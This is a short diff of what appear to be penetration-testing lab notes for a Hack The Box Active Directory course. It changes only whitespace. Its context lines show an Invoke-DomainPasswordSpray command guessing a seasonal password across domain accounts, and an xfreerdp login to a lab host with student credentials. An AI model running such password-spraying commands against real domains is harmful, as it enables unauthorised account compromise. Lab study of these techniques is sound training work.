@@ -34,7 +34,6 @@ dbranch
 Invoke-DomainPasswordSpray -Password Winter2022 -OutFile spray_success -ErrorAction SilentlyContinue
 ```
 
-
 ```go
 xfreerdp /v:10.129.36.162 /u:htb-student /p:'Academy_student_AD!' /cert:ignore /drive:WindowsSpray,/home/dan/Desktop/HTB/13-Active-Directory-Enumeration-And-Attacks /f
 ```
